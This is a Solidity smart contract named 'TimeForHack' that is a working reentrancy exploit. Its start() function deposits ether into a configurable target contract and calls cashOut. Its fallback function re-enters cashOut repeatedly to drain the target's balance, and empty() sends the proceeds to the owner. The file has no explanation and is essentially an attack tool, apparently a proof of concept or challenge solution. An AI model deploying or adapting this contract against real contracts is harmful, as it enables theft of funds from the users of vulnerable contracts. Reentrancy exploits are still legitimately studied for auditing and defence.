pragma solidity ^0.4.19;

import "./Ownable.sol";

interface Target {
    function cashOut(uint _am) public;
    function deposit() public payable;
}


contract TimeForHack is Ownable {

    address private targetAddr = 0x0;

    modifier addressSet() {
        require(targetAddr != address(0x0));
        _;
    }

    event Hacked(address indexed by, uint256 amount);
    event Called(address indexed by, uint256 amount);
    
    function () public payable {
        Target t = Target(targetAddr);
        // let's hack.
        if (msg.gas < 200000) {
            return;
        }
        Hacked(targetAddr, targetAddr.balance);
        if (msg.value <= targetAddr.balance) {
            t.cashOut(msg.value);
        }    
    }
    
    function start() external payable onlyOwner addressSet {
        Called(msg.sender, this.balance);
        Target t = Target(targetAddr);
        t.deposit.value(msg.value)();
        t.cashOut(msg.value);   
    }
    
    function empty() external onlyOwner {
        msg.sender.transfer(this.balance);
    }    

    function setTarget(address _target) external onlyOwner {
        require(_target != address(0x0));
        targetAddr = _target;
    }
}